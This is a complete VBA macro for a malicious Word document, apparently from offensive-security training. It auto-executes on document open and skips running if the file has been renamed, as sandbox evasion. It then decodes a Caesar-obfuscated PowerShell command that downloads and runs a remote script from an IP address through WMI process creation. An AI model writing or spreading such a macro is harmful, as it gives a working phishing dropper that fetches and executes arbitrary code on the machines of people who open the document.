' Decrypt character using Caesar cipher value of 17
Function DecryptChar(encryptedChar)
    DecryptChar = Chr(encryptedChar - 17)
End Function

' Fetch next three characters of encrypted string
Function GetNextChar(cipherText)
    GetNextChar = Left(cipherText, 3)
End Function

' Overwrite encrypted string to exclude characters that were just decrypted
Function Overwrite(cipherText)
    Overwrite = Right(cipherText, Len(cipherText) - 3)
End Function

' Loop through encrypted string
Function Decrypt(cipherText)
    Do
    decryptedString = decryptedString + DecryptChar(GetNextChar(cipherText))
    cipherText = Overwrite(cipherText)
    Loop While Len(cipherText) > 0
    Decrypt = decryptedString
End Function

Function MyMacro()
    ' Don't run if file was renamed
    If ActiveDocument.Name <> "Document1.doc" Then
        Exit Function
    End If

    Dim encryptedPayload As String
    Dim decryptedPayload As String
    ' Result of caesar_encrypt_powershell_for_vba.ps1 for PowerShell download cradle
    encryptedPayload = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063069074063073069064131134127063133137133056058058"
    decryptedPayload = Decrypt(encryptedPayload)
        
    ' Result of caesar_encrypt_powershell_for_vba.ps1 for winmgmts: and Win32_Process
    GetObject("winmgmts:").Get("Win32_Process").Create decryptedPayload, Null, Null, pid
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
